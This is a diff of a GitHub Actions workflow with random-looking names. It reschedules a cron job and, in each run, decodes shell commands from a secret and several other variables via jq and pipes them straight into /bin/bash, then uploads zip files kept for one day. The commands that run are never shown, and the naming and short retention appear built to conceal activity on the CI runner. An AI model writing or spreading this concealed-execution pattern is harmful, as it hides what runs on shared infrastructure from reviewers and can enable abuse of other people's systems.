@@ -1,22 +1,29 @@
 name: jishunrongxian
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '19 2/6 * * *'
-jobs:  # 28890
+    - cron: '18 1,7,13,19 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: jishunrongxian
         env:
-          wip5331: ${{ secrets.wip5331 }}
+          wqh0323: ${{ secrets.wqh0323 }}
         run: |
-          echo $wip5331 | jq -r .zs86990 | /bin/bash
-          echo $db6 | jq -r .nm7 | /bin/bash
-          echo $uwq4606 | jq -r .e76 | /bin/bash
-          echo $cluyb201 | jq -r .pyu12 | /bin/bash
-          echo $ztv58 | jq -r .dh74573 | /bin/bash
-          echo $g191 | jq -r .pnyet17599 | /bin/bash
+          printf '%s' "$wqh0323" | jq -r .tkarn0 | /bin/bash
+          printf '%s' "$fp1780" | jq -r .fyhj83 | /bin/bash
+          echo $nthli840 | jq -r .x781 | /bin/bash
+          printf '%s' "$fmp3259" | jq -r .qs69 | /bin/bash
+          echo $ejcq2670 | jq -r .jzivr696 | /bin/bash
+          printf '%s' "$bsilp879" | jq -r .d4 | /bin/bash
+          echo $jiq89 | jq -r .lvroq177 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: SDKMMTTk
+          path: "*.zip"
+          retention-days: 1
